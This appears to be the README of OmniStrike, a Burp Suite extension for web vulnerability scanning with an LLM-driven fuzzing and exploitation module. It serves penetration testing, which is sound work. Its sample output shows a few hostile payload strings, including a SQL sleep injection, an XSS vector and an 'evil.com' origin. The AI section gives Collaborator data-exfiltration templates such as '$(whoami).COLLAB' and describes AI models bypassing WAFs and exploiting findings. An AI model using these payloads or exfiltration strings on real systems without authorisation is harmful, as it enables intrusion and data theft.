<p align="center">

</p>

<h1 align="center">OmniStrike</h1>

<p align="center">
  <strong>One extension to replace them all.</strong><br>
  14 active scanners, 4 passive analyzers, and AI-powered analysis — in a single JAR.
</p>

<p align="center">
  <a href="https://github.com/worldtreeboy/OmniStrike/releases"><img src="https://img.shields.io/badge/version-1.28-blue?style=flat-square" alt="Version"></a>
  <img src="https://img.shields.io/badge/Java-17+-orange?style=flat-square&logo=openjdk" alt="Java 17+">
  <img src="https://img.shields.io/badge/Burp_Suite-Montoya_API-E8350E?style=flat-square" alt="Montoya API">
  <a href="LICENSE"><img src="https://img.shields.io/github/license/worldtreeboy/OmniStrike?style=flat-square" alt="License"></a>
</p>

<p align="center">
  <a href="https://github.com/worldtreeboy/OmniStrike/stargazers"><img src="https://img.shields.io/github/stars/worldtreeboy/OmniStrike?style=flat-square&color=yellow" alt="Stars"></a>
  <a href="https://github.com/worldtreeboy/OmniStrike/releases"><img src="https://img.shields.io/github/downloads/worldtreeboy/OmniStrike/total?style=flat-square&color=green" alt="Downloads"></a>
  <a href="https://github.com/worldtreeboy/OmniStrike/issues"><img src="https://img.shields.io/github/issues/worldtreeboy/OmniStrike?style=flat-square" alt="Issues"></a>
</p>

<p align="center">
  <a href="#quick-start">Quick Start</a> &bull;
  <a href="#scanner-modules">Modules</a> &bull;
  <a href="#ai-powered-scanning">AI Scanning</a> &bull;
  <a href="#building-from-source">Build</a> &bull;
  <a href="#contributing">Contribute</a>
</p>

---

<!-- Replace with actual screenshots/GIFs -->
<p align="center">
  <img src="docs/demo.gif" alt="OmniStrike Demo" width="700">
  <br>
  <em>Right-click any request. Select OmniStrike. Get results.</em>
</p>

---

## How It Works

```
                                 OmniStrike Engine
                        ┌─────────────────────────────────┐
                        │                                 │
  HTTP Request  ───────►│  Scope Filter                   │
                        │       │                         │
                        │       ▼                         │
                        │  Deduplication                  │
                        │       │                         │
                        │       ▼                         │
                        │  Module Router                  │
                        │    ┌──┼──┐                      │
                        │    ▼  ▼  ▼                      │
                        │  ┌──────────────────────────┐   │
                        │  │ 14 Active   4 Passive    │   │
                        │  │ Scanners    Analyzers    │   │
                        │  │        AI Analyzer       │   │
                        │  └──────────┬───────────────┘   │
                        │             │                   │
                        │             ▼                   │
                        │     Findings Store              │
                        │    (deduplicated)               │
                        └────────┬────────────────────────┘
                                 │
                    ┌────────────┼────────────┐
                    ▼            ▼            ▼
              Burp Dashboard  OmniStrike   CSV / Markdown
                                Tab          Export
```

---

## Key Highlights

**19 Modules, One JAR** &mdash; SQLi, XSS, SSRF, SSTI, RCE, XXE, deserialization, GraphQL, CORS, cache poisoning, path traversal, host header injection, HPP, prototype pollution, and more. All deduplicated, all in one place.

${\color{#FF0000}\textbf{S}}{\color{#FF4500}\textbf{c}}{\color{#FF8C00}\textbf{a}}{\color{#FFA500}\textbf{n}}$ ${\color{#FFD700}\textbf{W}}{\color{#ADFF2F}\textbf{h}}{\color{#32CD32}\textbf{i}}{\color{#00CC00}\textbf{l}}{\color{#00CED1}\textbf{e}}$ ${\color{#1E90FF}\textbf{Y}}{\color{#4169E1}\textbf{o}}{\color{#6A5ACD}\textbf{u}}$ ${\color{#8A2BE2}\textbf{B}}{\color{#9400D3}\textbf{r}}{\color{#BA55D3}\textbf{o}}{\color{#FF00FF}\textbf{w}}{\color{#FF1493}\textbf{s}}{\color{#FF69B4}\textbf{e}}$ &mdash; Set your target scope, click Start, and just browse. OmniStrike's static scanners automatically test every in-scope request in real time. AI scanning is manual-only (right-click) to prevent token waste. Want more control? Right-click any request to scan it ad-hoc with any module.

**AI-Augmented (Manual Only)** &mdash; Right-click any request to trigger AI analysis — never auto-fires on every proxied request, so zero wasted tokens. Optionally delegate analysis to Claude, GPT, or Gemini via API key, or use Claude/Gemini/Codex/OpenCode CLI tools. The AI generates targeted payloads, bypasses WAFs, performs multi-round adaptive scanning with full response feedback, fingerprints WAFs before fuzzing, learns from confirmed findings across parameters, chains Collaborator data exfiltration, remembers every payload already tested per URL/param/vuln type (fuzz history), and supports multi-step exploitation of confirmed vulnerabilities.

**Built for Speed** &mdash; **OOB-first detection** sends Collaborator payloads before any other technique — if OOB confirms, all remaining phases are skipped for that parameter. **Smart character filter probing** reduces active payloads from 35+ to 5-10 per parameter. Concurrent execution on a bounded thread pool. Non-blocking passive analysis.

---

## Why OmniStrike?

### The Problem

A typical Burp setup for thorough testing requires 15-20 standalone extensions: one for SQLi, one for XSS, one for SSRF, one for CORS, one for SSTI, one for deserialization, and so on. Each extension has its own UI tab, its own configuration, its own findings format, and its own quirks. The result is **extension bloat**, **UI clutter**, **duplicated findings**, and **wasted time** switching between tabs.

### The OmniStrike Solution

| | The Old Way | OmniStrike |
|---|---|---|
| **Extensions** | 15-20 separate JARs | 1 JAR |
| **UI Tabs** | 15-20 tabs cluttering Burp | 1 unified tab |
| **Configuration** | Configure each extension individually | Single scope + module toggles |
| **Findings** | Scattered across extensions, duplicated | Deduplicated, centralized, exportable |
| **Data sharing** | Extensions can't share intel | Shared data bus across modules |
| **Updates** | Track 15+ repos for updates | One release, everything updated |
| **AI integration** | None or per-extension | Unified AI layer across all modules |

---

## Example: What a Scan Looks Like

> Scan a single request against `https://target.com/search?q=test` — here's what OmniStrike finds:

```
 CRITICAL  SQLi: Time-Based Blind (MySQL) — param 'q'
           Payload: test' AND SLEEP(18)-- -
           Baseline: 142ms (max of 3) → Injected: 18,203ms (+18,061ms)
           DB: MySQL (fingerprinted via error pattern)

 CRITICAL  Blind SSRF via Collaborator — param 'q'
           Payload: https://<collaborator>.oastify.com
           DNS interaction from 10.0.0.5 after 2.3s

 HIGH      XSS Confirmed: img onerror in HTML_BODY — param 'q'
           Filter probe: PASS=[<>"=] BLOCK=['()/]
           Adaptive payload: <img src=x onerror=alert`1`>  (backtick call — parens blocked)

 HIGH      SSTI: Jinja2 Detected — param 'q'
           Probe: {{133*991}} → Response contains '131803' (expression evaluated)
           Engine confirmed via {{ config.items() }} error pattern

 MEDIUM    CORS Misconfiguration: Reflected Origin
           Origin: https://evil.com → Access-Control-Allow-Origin: https://evil.com
           Access-Control-Allow-Credentials: true

 MEDIUM    Security Headers Missing
           ✗ Content-Security-Policy absent
           ✗ X-Frame-Options absent
           ✗ Strict-Transport-Security absent

 LOW       DOM XSS: location.hash → .innerHTML (sanitizer detected)
           Source: location.hash | Sink: .innerHTML
           DOMPurify.sanitize() present — risk reduced

 INFO      Hidden Endpoints Discovered (14 paths)
           /api/v2/admin/users, /api/internal/debug, /graphql, ...
```

<p align="center"><em>Real finding format from OmniStrike. Severity-rated, deduplicated, with full evidence chains.</em></p>

---

## Smart XSS: Filter Probing

Most scanners blindly fire 35+ payloads per parameter. OmniStrike probes the filter first.

```
  Step 1                Step 2                 Step 3                Step 4
  Inject Canary         Probe Characters       Analyze Results       Adapt Payloads
 ┌──────────────┐     ┌──────────────────┐   ┌──────────────────┐  ┌──────────────────┐
 │ Send unique   │     │ Send canary with │   │ PASS: < > " =    │  │ Skip 28 payloads │
 │ marker string │────►│ <>"'/(;)={}      │──►│ BLOCK: ' ( ) /   │─►│ that need ( ) '  │
 │ xSsX7c4n4ry  │     │ appended         │   │                  │  │                  │
 └──────┬───────┘     └──────────────────┘   └──────────────────┘  │ Generate 3-5     │
        │                                                          │ adaptive evasions │
   Not reflected?                                                  │ using < > " =    │
   Skip parameter.                                                 └──────────────────┘
```

**Example:** If `(` and `)` are blocked but backticks pass, OmniStrike generates `` alert`1` `` instead of `alert(1)`. If quotes are blocked, it uses unquoted attribute injection. Result: 3 requests instead of 35+.

---

## Quick Start

```
1. Download omnistrike.jar from Releases
2. Burp Suite → Extensions → Add → Java → select omnistrike.jar
3. Right-click any request → Send to OmniStrike (All Modules)
```

That's it. Findings appear in Burp's Dashboard and the OmniStrike tab.

---

## Scanner Modules

<details>
<summary><strong>Active Scanners (14 Modules)</strong> &mdash; click to expand</summary>

<br>

<details>
<summary><strong>SQLi Detector</strong></summary>

Authentication bypass with auth-artifact proof (session cookie + success content required), error-based with baseline stability verification (DB-specific error patterns only), UNION-based with marker exfiltration confirmation, **time-based blind** with **3-step verification** (stable baseline, true-condition delay, false-condition must NOT delay), **boolean-blind** with **2-round reproducibility** (4 consistency checks), **64 OOB payloads** via Collaborator (MySQL 11, MSSQL 18, Oracle 14, PostgreSQL 13, SQLite 2, Generic 6 — including CHAR() WAF bypass, xp_cmdshell HTTP callbacks, DBMS_SCHEDULER, BULK INSERT, dblink variants), XML body injection. DB fingerprinting (INFO-only). **~375 payloads per parameter** across 6 detection phases. Comment-as-space and encoding bypasses.
</details>

<details>
<summary><strong>XSS Scanner</strong></summary>

**Context-aware injection** across 6 reflection contexts (HTML body, attribute, JavaScript, template literal, comment, CSS). **Smart character filter probing** — probes `<>"'/(;)={}[]|!` to determine which characters survive server-side filtering, then selects only viable payloads and generates **adaptive evasions** tailored to the filter profile. 9-phase passive DOM XSS analysis with variable flow tracking. **Client-side template injection (CSTI)** detection for AngularJS/Vue. **Framework-specific XSS** — auto-detects AngularJS, Angular 2+, Vue.js, React/Next.js, and jQuery from response fingerprints, then fires targeted payloads: 18 AngularJS sandbox escapes (version-specific from 1.2.0 through 1.6+), 9 Angular DomSanitizer bypasses, 15 Vue template/v-html exploits, 12 React dangerouslySetInnerHTML and href javascript: vectors, 14 jQuery .html() sink and CVE payloads (CVE-2012-6708, CVE-2020-11023). **DOM clobbering** and **mutation XSS (mXSS)** pattern detection. **URL path segment injection**. **Encoding negotiation XSS** (UTF-7, ISO-2022-JP, overlong UTF-8). **Response header injection** via CRLF. Filter evasion with mutation XSS, SVG payloads, unicode escapes, polyglot vectors. Blind XSS via Collaborator.
</details>

<details>
<summary><strong>SSRF Scanner</strong></summary>

Collaborator OOB detection, cloud metadata endpoints with **multi-marker structural validation** (AWS requires ami-id+instance-id, Azure requires vmId+resourceGroupName, Oracle requires displayName+compartmentId — single generic words like "id" or "region" never constitute a finding), DNS rebinding, 49 localhost bypasses (IPv6, hex, octal, DNS wildcards, enclosed alphanumeric, nip.io/xip.io), 31 protocol smuggling payloads (gopher to Redis/SMTP/MongoDB/PostgreSQL/MySQL/Memcached, LDAP, TFTP, SFTP, netdoc, Kubernetes secrets).
</details>

<details>
<summary><strong>SSTI Scanner</strong></summary>

Detection for **20 template engines** (Jinja2, Twig, Freemarker, Velocity, Pebble, Thymeleaf, Mako, Tornado, Smarty, Blade, ERB, Slim, Handlebars, EJS, Nunjucks, Dust, Jade/Pug, Mustache, Liquid, Groovy, Plates). **Unique large-number probes** (133*991=131803 instead of 7*7=49 — eliminates false positives from page numbers, dates, and article IDs). **Template syntax consumption verification** — the raw payload must NOT appear in the response (reflection ≠ evaluation). Engine-specific error patterns, 32 OOB payloads via Collaborator.
</details>

<details>
<summary><strong>Command Injection</strong></summary>

**3-step time-based verification** (true delay → control with zero delay returns within baseline → true delay again) with 18s delay, 80% threshold, error-page discard, and serialized execution via global timing lock. **Output-based with structural regexes** — `uid=\d+` not "uid=", `Linux\s+\S+\s+\d+\.\d+` not "Linux", `inet\s+IP` not "inet", `[d-][rwx-]{9}\s+\d+` for `ls -la` output, unique 6-digit math markers (131337) instead of "42". **Header injection restricted** — User-Agent, Referer, X-Forwarded-For, X-Forwarded-Host, and Origin are only tested via time-based 3-step and OOB Collaborator (never output-based — header changes cause WAF blocks and routing differences unrelated to command execution). 403/404/500 responses with body < 500 bytes automatically discarded. **141 payloads per parameter**: 33 Unix `sleep` + 13 Windows `ping` time payloads, 36 Unix + 18 Windows output probes (including `ls -la` with permission-string regex matching), 26 Unix + 15 Windows OOB via Collaborator. `$IFS` space bypass, `%0a` newline injection, env variable concatenation, backtick nesting, CRLF variants, double-encoding, wildcard globbing.
</details>

<details>
<summary><strong>XXE Scanner</strong></summary>

**4-phase attack pipeline**: Phase 1 (XML body) — classic SYSTEM/PUBLIC entity file read, error-based XXE, blind OOB via Collaborator (14 payloads: parameter entity, FTP, JAR, netdoc, gopher, PHP filter/expect). Phase 2 (XInclude) — injection into non-XML parameters via `xi:include`. Phase 3 (JSON→XML conversion) — sends XML with `application/xml` Content-Type to JSON endpoints. Phase 4 (Content-Type forcing) — probes non-XML/non-JSON endpoints by forcing `Content-Type: application/xml` to test hidden XML parser acceptance. **Target fingerprinting** via Server/X-Powered-By headers to detect OS and runtime — skips irrelevant payloads. **SAML context detection**. **Bypass techniques**: UTF-16 LE/BE encoding with BOM, HTML-encoded parameter entities, CDATA section wrapping, nested entity definitions.
</details>

<details>
<summary><strong>Deserialization Scanner</strong></summary>

**6-language coverage** with passive fingerprinting, active payload injection, and **OOB-first Collaborator detection** (~56 verified OOB payloads — all validated for real-world exploitability):

- **Java** — 16 time-based gadget chains (CommonsCollections 1-7, Spring1-2, BeanUtils, Groovy1, Hibernate1, C3P0, JRMPClient, ROME, BeanShell1, Myfaces1, Jdk7u21, Vaadin1, Click1), 32 vulnerable library signatures, ~19 OOB payloads (JNDI LDAP/RMI/DNS, Fastjson JdbcRowSetImpl/JndiDataSourceFactory/UnixPrintService/1.2.68+/LdapAttribute, Jackson JdbcRowSetImpl/C3P0/Logback, XStream ProcessBuilder/EventHandler/SortedSet, SnakeYAML ScriptEngineManager/JdbcRowSet/C3P0)
- **.NET** — 12 BinaryFormatter + 15 JSON.NET + 7 XML serializer payloads, ~9 OOB payloads (ObjectDataProvider nslookup/certutil/PowerShell, XAML XamlReader/DataContractSerializer XXE/SoapFormatter SSRF, SoapFormatter ObjectDataProvider, XmlDocument XXE)
- **PHP** — 14 framework chains (WordPress, Magento, Laravel, Monolog, Drupal, ThinkPHP, CakePHP), 3 OOB payloads (SoapClient SSRF + WSDL, Monolog SocketHandler — all with correct PHP null bytes and string lengths)
- **Python** — 12 active payloads + 12 OOB payloads (Pickle os.system/os.popen/urllib/builtins.exec, PyYAML os.system/subprocess, jsonpickle, Pickle P2 binary variants)
- **Ruby** — 8 active payloads + 5 OOB payloads (Gem::Source YAML, Marshal binary Gem::Source @uri, Marshal Gadget chain nslookup/curl/wget). Detects Marshal data in cookies and YAML object tags.
- **Node.js** — 8 active payloads + 12 OOB payloads (node-serialize HTTP/nslookup/curl/wget/DNS, cryo HTTP/nslookup, funcster HTTP/nslookup, js-yaml HTTP/nslookup, prototype pollution)

38 suspect cookie name patterns. **OOB-first architecture**: Collaborator payloads fire before time-based/error-based phases; if OOB confirms, remaining phases are skipped.
</details>

<details>
<summary><strong>GraphQL Scanner</strong></summary>

**7-phase testing**: introspection & discovery (4 bypass techniques, IDE detection with HTML markup validation), schema analysis (INFO-only — field/mutation/type observations require manual verification), injection via arguments (SQLi with DB-specific errors + time-based false-condition verification, NoSQLi with MongoDB-specific error patterns, CMDi, SSTI with large math canaries 133*991=131803, path traversal + OOB), IDOR observation (INFO-only — requires manual two-session verification), DoS configuration observations (INFO-only — batch, depth, alias, circular fragments, directives), HTTP-level tests (GET queries, content-type, CSRF), error & info disclosure (stack trace detection with standard GraphQL error filtering, framework fingerprinting). Auto-generates executable queries from introspection schema.
</details>

<details>
<summary><strong>CORS Misconfiguration</strong></summary>

Reflected `Origin` header, `null` origin trust, subdomain trust validation, scheme downgrade (HTTPS to HTTP), wildcard with credentials, preflight request bypass.
</details>

<details>
<summary><strong>Cache Poisoning</strong></summary>

Unkeyed header reflection detection across 30 header vectors, 29 unkeyed query parameter tests, cacheability analysis, optional cache poison confirmation with clean request verification.
</details>

<details>
<summary><strong>Host Header Injection</strong></summary>

Password reset poisoning via Collaborator, routing-based SSRF, duplicate `Host` header, override headers (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`).
</details>

<details>
<summary><strong>HTTP Parameter Pollution</strong></summary>

4-phase testing: duplicate parameter precedence detection (FIRST vs LAST vs BOTH), conflicting values for privilege escalation (15 privilege-related patterns), WAF bypass via payload splitting, tests across URL query, body, and cookie parameters.
</details>

<details>
<summary><strong>Prototype Pollution</strong></summary>

Server-side `__proto__` and `constructor.prototype` injection with **canary persistence verification** (random canary keys, echo-back disqualification, 400/422 rejection detection). Behavioral gadgets: JSON spaces indentation, content-type mutation, status code change. Automatic cleanup verification after testing.
</details>

<details>
<summary><strong>Path Traversal / LFI</strong></summary>

**Absolute path testing** (direct `/etc/passwd`, `C:\windows\win.ini` without traversal — catches direct file path usage), Unix file reads (24 targets including sshd_config, my.cnf, redis.conf, openssl.cnf, pg_hba.conf, access logs) and Windows file reads (9 targets including license.rtf, mysql my.ini) with **structural content validation** — every finding requires file-specific multi-marker signatures (e.g., `root:x:0:0:` for passwd, `[mysqld]` + datadir for my.cnf, `# TYPE DATABASE USER` + auth rules for pg_hba.conf, Apache combined log format for access logs). **26 encoding bypasses** (double/triple URL encoding, UTF-8 overlong, null byte injection with extension bypass, null byte traversal segment, fullwidth dots/solidus, IIS 16-bit Unicode, Tomcat jsessionid bypass, carriage return injection) — payloads injected raw without re-encoding to preserve pre-encoded sequences (`%252e`, `%00`, `%c0%af`). PHP wrappers with decoded content validation: `php://filter` base64 decode, iconv UTF-7 marker detection (`+ADw-`, `+AD4-`), `data://` phpinfo structural verification, ROT13 marker detection. Zero response-difference-only findings.
</details>

</details>

<details>
<summary><strong>Passive Analyzers (4 Modules)</strong> &mdash; click to expand</summary>

<br>

| Module | Capabilities |
|---|---|
| **Client-Side Analyzer** | DOM XSS source-to-sink flow analysis with sanitizer detection, prototype pollution with defensive-check filtering, hardcoded secrets with entropy validation and placeholder detection, insecure `postMessage` handlers, open redirect patterns with URL-validation filtering, endpoint extraction. **Minified library auto-skip** — skips analysis on jQuery/React/Angular/Vue/Bootstrap bundles. **Comment-aware** — all findings inside HTML/JS comments are discarded. 10 check categories. |
| **Hidden Endpoint Finder** | Extracts API endpoints, internal paths, and URLs from JavaScript, HTML, and JSON responses using 13+ regex patterns. Results shared via the internal data bus. |
| **Subdomain Collector** | Discovers subdomains from CSP headers, CORS headers, HTTP redirects, and response body content. |
| **Security Header Analyzer** | Audits HSTS, CSP, CORS, cookie flags (Secure, HttpOnly, SameSite), X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy, server version disclosure. Per-host deduplication. |

</details>

<details>
<summary><strong>AI Vulnerability Analyzer (1 Module)</strong> &mdash; click to expand</summary>

<br>

| Mode | Description |
|---|---|
| **Smart Fuzzing** | LLM analyzes the HTTP exchange and generates targeted payloads based on parameter names, content types, and technology indicators. Priority-ordered prompts per vulnerability class (e.g., error-based SQLi before blind). |
| **WAF Bypass** | When payloads are blocked, the LLM generates evasion variants specific to the observed blocking behavior. |
| **Adaptive Scanning** | Multi-round testing (max 5 rounds) where each round's **full HTTP response** (status, headers, body) informs the next payload set. Auto-stops after 3 rounds with no progress. |
| **Cross-File Batch Scan** | Queue multiple JS/HTML responses and analyze them together for cross-file DOM XSS, shared prototype pollution chains, and cross-file data flows. |
| **WAF Fingerprinting** | Before fuzzing, probes the target with 5 known-bad payloads to build a per-host WAF fingerprint. AI knows upfront which payload categories are blocked vs. pass, so it starts with viable payloads. Cached per host. |
| **Technology Stack Context** | Collects Server header, X-Powered-By, framework detection, database type, CDN/WAF indicators from response headers and other scanner findings. Included in AI prompts for technology-specific payloads. |
| **Payload Learning** | Per-scan session context accumulates confirmed findings. When scanning parameter B after confirming SSTI on parameter A, AI knows: "Jinja2 confirmed — prioritize Jinja2 payloads." Last 10 confirmed findings enriches every prompt. |
| **Collaborator Data Exfil** | AI embeds data exfiltration in Collaborator URLs: `$(whoami).COLLAB`, `LOAD_FILE(CONCAT(version(),'.COLLAB'))`. Turns binary OOB confirmation into data extraction. |
| **Rate Limit Awareness** | Tracks 429s per host, auto-pauses with Retry-After backoff, detects IP-level blocking (5+ identical block responses), halts and reports when blocked. |
| **Multi-Step Exploitation** | Right-click any confirmed finding > **Exploit This Finding (AI)** — AI generates exploitation payloads (SQLi: dump tables, CMDi: enumerate users, SSTI: escalate to RCE, Path Traversal: read high-value files). Multi-round chaining with results feedback. |
| **Cost Tracking** | Tracks input/output tokens per API call, displays running total in the AI panel: calls, token counts, estimated cost. |
| **Structured Output** | Enforces strict JSON output. Retries once with stricter prompt on malformed JSON before falling back. |
| **Static Scanner Dedup** | Tells AI which payload categories the static scanner already tested so it focuses on novel evasion techniques. |
| **Fuzz History** | Per-URL, per-parameter, per-vulnerability-type memory of every payload already sent — including status code, response time, WAF block status, and whether a vuln was triggered. On re-scan, the AI sees everything that was already tried and generates only novel payloads. Duplicate payloads are filtered even if the AI ignores the instruction. Each vuln type (SQLi, XSS, SSTI, etc.) maintains its own separate record. |
| **Prompt Size Management** | 8K token budget. Response bodies truncated to 500 bytes, CSS/JS boilerplate stripped, older rounds summarized when budget exceeded. |
| **Hardened Detection** | **OOB-first strategy**: all injection scanners (SQLi, CmdI, SSRF, SSTI, XXE) fire Collaborator payloads as Phase 1 — if OOB confirms, remaining phases are skipped. SSTI uses large unique math canaries (131803, 3072383) instead of generic `7*7=49`. XSS only confirms verbatim payload reflection. CMDi uses OS-specific output patterns. Time-based blind detection for SQLi and CMDi (18s delay, serialized via global timing lock, opt-in). No generic 500-error findings. |

Supports **Claude CLI**, **Gemini CLI**, **Codex CLI**, **OpenCode CLI**, and direct **API Key** access (Anthropic, OpenAI, Google Gemini).

</details>

---

## Detection Capabilities

| Capability | Detail |
|---|---|
| **Zero-FP philosophy** | Every finding requires detection-specific proof — structural content validation, behavioral confirmation, or canary persistence. Response differences alone never constitute a finding. |
| **Multi-step timing verification** | 3-step confirmation: stable baseline → true condition delays (18s) → false condition does NOT delay. Baseline stability check rejects unstable endpoints. Time-based tests are serialized across all modules via a global timing lock to prevent concurrent timing measurements from corrupting each other's baselines. **Disabled by default** — enable via the "Time-Based Testing" checkbox in the UI. |
| **2-round boolean confirmation** | Boolean-blind findings require reproducible distinction across 2 independent rounds (4 consistency checks). |
| **Structural content validation** | Path traversal confirms file reads via file-specific signatures, not response differences. PHP wrappers decode and validate content. |
| **Smart payload encoding** | Custom `PayloadEncoder` handles all parameter types: query/body params encode HTTP-breaking characters (space, `&`, `#`, `+`, `;`, bare `%`) while preserving pre-encoded bypass sequences (`%0a`, `%00`, `%252e`, `%c0%af`). Cookie injection bypasses Burp's parser via raw header replacement — no `;` splitting. JSON/XML bodies use format-native escaping. |
| **Smart filter probing** | Probes which characters survive server-side filtering, then selects only viable payloads and generates adaptive evasions |
| **Context-aware XSS** | Payloads adapt to 6 distinct reflection contexts with per-context evasion strategies |
| **Comment & library awareness** | Passive analyzer auto-skips minified libraries and discards matches inside HTML/JS comments |
| **Request/response highlighting** | Findings in Burp's Dashboard highlight the injected payload in the request and the matched evidence in the response — just like Burp's native scanner. All 19 modules annotate findings with byte-range markers. |
| **OOB detection** | Blind SQLi, XXE, SSRF, RCE, and deserialization via Burp Collaborator callbacks |
| **Deduplication** | Findings deduplicated by normalized URL with cross-module overlap prevention |

### OWASP Top 10 Coverage

| OWASP Category | OmniStrike Modules |
|---|---|
| **A01 Broken Access Control** | Auth Bypass, CORS Misconfiguration, IDOR via GraphQL |
| **A02 Cryptographic Failures** | Security Header Analyzer (cookie flags, HSTS) |
| **A03 Injection** | SQLi, XSS, SSTI, CMDi, XXE, HPP |
| **A04 Insecure Design** | GraphQL schema analysis, Hidden Endpoint Finder |
| **A05 Security Misconfiguration** | Security Headers, CORS, Cache Poisoning, Host Header |
| **A06 Vulnerable Components** | Deserialization gadget chains (Java/.NET/PHP/Python/Ruby/Node.js), Prototype Pollution |
| **A07 Auth Failures** | Auth Bypass scanner, session cookie analysis |
| **A08 Data Integrity** | Deserialization, SSRF, Host Header Injection |
| **A09 Logging Failures** | Verbose error detection, debug endpoint discovery |
| **A10 SSRF** | SSRF Scanner, cloud metadata, DNS rebinding, protocol smuggling |

---

## Usage

### Right-Click Scanning

1. Right-click any request in Proxy, Repeater, or Target.
2. Select **Send to OmniStrike (All Modules)** for comprehensive scanning, or choose a specific module.
3. Findings appear in Burp's Dashboard and the OmniStrike tab.

### Targeted Parameter Scanning

Right-click any request in Burp and use the **Scan Parameter >** submenu to pick exactly which parameter to test:

- **Scan Parameter >** &mdash; always-visible submenu listing every parameter in the request (URL, body, cookie) plus parameters extracted from Referer/Origin header URLs and injectable header names (Referer, User-Agent, Host, X-Forwarded-For, etc.). Each parameter has **All Modules** + per-module Normal/AI scan options. No text selection required.
- **Scan This Parameter (ip) &mdash; All Modules** &mdash; appears when you highlight a parameter in the editor. Runs all active scanners against only the selected parameter.
- **Scan This Parameter (ip) >** &mdash; per-module submenu with Normal Scan and AI Scan options, all restricted to the highlighted parameter.

This mirrors Burp Pro's "Scan defined insertion points" concept &mdash; focus your scan on the parameter that matters.

### Automated Scope-Based Scanning (Hands-Free)

1. Open the **OmniStrike** tab. Enter target domains in **Target Scope**.
2. Toggle modules on/off in the sidebar. Click **Start**.
3. That's it — just browse normally through Burp Proxy. Every in-scope request is **automatically intercepted and scanned** by all enabled modules in real time. No need to manually select requests or click "scan." You browse, OmniStrike hunts.

### Time-Based Testing (Opt-In)

Time-based blind injection tests (SQLi `SLEEP`, CmdI `sleep`/`ping`) are **disabled by default** — they are slow, generate heavy traffic, and can cause delays on the target server.

To enable: tick the **Time-Based Testing** checkbox next to the **Stop Scans** button in the OmniStrike tab. This globally enables time-based phases in the SQLi Detector and Command Injection Scanner. Untick to disable at any time.

### Session Keep-Alive (Opt-In)

Long scans can outlast session timeouts — if your cookies expire mid-scan, all subsequent requests silently fail. OmniStrike's **Session Keep-Alive** periodically replays a saved login request so Burp's CookieJar stays fresh.

1. Log in to the target app through Burp Proxy.
2. Find the login request in Proxy History, right-click → **Set as Session Login Request**.
3. In the OmniStrike tab, check **Session Keep-Alive** and choose an interval (default: 5 min).

The extension replays the saved request via `api.http().sendRequest()` — Burp automatically stores `Set-Cookie` responses back into its CookieJar. No custom cookie jar, no localhost ports. Status indicator shows **Session: Active** (green), **Session: EXPIRED** (red), or **Session: Not configured** (gray). Right-click → **Clear Session Login Request** to remove.

### AI Scanning Setup

**Option A: API Key (recommended — no CLI tool needed)**

1. In the OmniStrike tab, select **API Key** mode.
2. Choose a provider: **Anthropic (Claude)**, **OpenAI**, or **Google Gemini**.
3. Select a model from the dropdown, paste your API key, click **Apply Settings** and **Test Connection**.
4. Right-click any request > select a module > **AI Scan**.

| Provider | Models | Get an API Key |
|---|---|---|
| Anthropic (Claude) | `claude-opus-4-6`, `claude-sonnet-4-6`, `claude-haiku-4-5-20251001` | [console.anthropic.com](https://console.anthropic.com/) |
| OpenAI | `gpt-5.2`, `gpt-4o`, `o3-mini` | [platform.openai.com](https://platform.openai.com/) |
| Google Gemini | `gemini-3.1-pro`, `gemini-3-flash-preview`, `gemini-2.5-flash` | [aistudio.google.com](https://aistudio.google.com/) |

> API keys are stored in memory only — they are never persisted to disk.

**Option B: CLI Tool**

1. Install and authenticate a CLI tool: `npm install -g @anthropic-ai/claude-code` (or Gemini/Codex/OpenCode).
2. In the OmniStrike tab, select **CLI Tool** mode, configure the binary path, click **Apply Settings** and **Test Connection**.
3. Right-click any request > select a module > **AI Scan**.

> Only one mode (CLI or API Key) can be active at a time.

---

## Prerequisites

| Requirement | Details |
|---|---|
| **Burp Suite** | Professional (recommended) or Community. OOB detection requires Professional. |
| **Java** | JDK/JRE 17+ |
| **AI module** (optional) | **API Key** for Anthropic / OpenAI / Google Gemini, **or** a CLI tool: [Claude CLI](https://www.npmjs.com/package/@anthropic-ai/claude-code), [Gemini CLI](https://www.npmjs.com/package/@google/gemini-cli), [Codex CLI](https://www.npmjs.com/package/@openai/codex), or [OpenCode CLI](https://github.com/opencode-ai/opencode) |

---

## Building from Source

```bash
git clone https://github.com/worldtreeboy/OmniStrike.git
cd OmniStrike
./gradlew shadowJar
```

Output: `build/libs/omnistrike.jar` &mdash; a single fat JAR with all dependencies bundled.

| Dependency | Version | Purpose |
|---|---|---|
| `montoya-api` | 2026.2 | Burp Suite extension API |
| `gson` | 2.11.0 | JSON serialization |

---

## Contributing

1. Fork the repository and create a feature branch.
2. Ensure `./gradlew shadowJar` compiles cleanly.
3. Test against a local target ([DVWA](https://github.com/digininja/DVWA), [Juice Shop](https://github.com/juice-shop/juice-shop), or [PortSwigger Academy](https://portswigger.net/web-security)).
4. Open a pull request with a description of changes and testing methodology.

For bugs and feature requests: [GitHub Issues](https://github.com/worldtreeboy/OmniStrike/issues).

---

## What's New in v1.28

**Blind OOB Deserialization Spray** &mdash; Deserialization scanner no longer requires passive detection before active testing. When no serialized data is found in traffic, the scanner now blind-sprays OOB payloads (Collaborator) into all cookies and body parameters across all 6 languages (Java, PHP, .NET, Python, Ruby, Node.js). OOB-first, as always.

- **Blind spray on zero passive hits** &mdash; Previously, if `passiveAnalyzeRequest()` found no `DeserPoint`s, the scanner returned immediately with no active testing. Now it falls back to blind OOB testing on every cookie and body parameter.
- **Per-parameter blind spray** &mdash; Context menu "Scan parameter" mode also triggers blind OOB spray when passive detection finds nothing for the target parameter.
- **Deduplication** &mdash; Blind spray uses separate dedup keys (`param:language:blind`) so it doesn't interfere with normal passive→active flow, and won't re-spray the same endpoint on repeated scans.

### Previous (v1.27)

**Comprehensive Bug Audit** &mdash; Full codebase audit across all 19 modules with 30+ bug fixes covering thread safety, false positives, race conditions, and logic errors.

- **Removed CRLF Injection module** &mdash; Redundant with XSS scanner's response header injection. 20 → 19 modules.
- **Fixed OOB AtomicReference race condition** &mdash; All 7 injection modules using Collaborator OOB callbacks now use spin-wait pattern to prevent null request/response in findings when the poller fires before the sending thread completes.
- **Fixed FindingsStore thread safety** &mdash; `addFinding()` and `clearModule()` now synchronized. Cross-module dedup keys (`xmod:`) properly rebuilt on module clear.
